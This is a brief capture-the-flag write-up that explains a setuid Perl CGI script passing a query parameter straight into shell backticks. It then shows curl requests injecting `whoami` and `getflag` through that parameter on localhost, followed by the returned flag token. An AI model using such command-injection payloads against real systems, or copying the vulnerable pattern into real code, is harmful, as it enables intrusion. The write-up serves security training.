# level04

There is a perl script with the s permission again, for the user `flag04`

Understand the script:
```perl
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

It imports CGI, qw is just a "quick way", a faster way to write arrays
sub x: it defines a subroutine named x:
  - put first argument in $y
  - print the result of the backstick operator; a shell cmd that can be exploited

It then get a param named x, and call subroutine x with the parameter \
We just need to run the program as follows: `./level04.pl x="PARAM"`

Now we've understood how the program behave we can execute the program on the server (hinted by the comment `# localhost:4747`)

```bash
curl localhost:4747?x='`whoami`'
# flag04
curl localhost:4747?x='`getflag`'
# Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
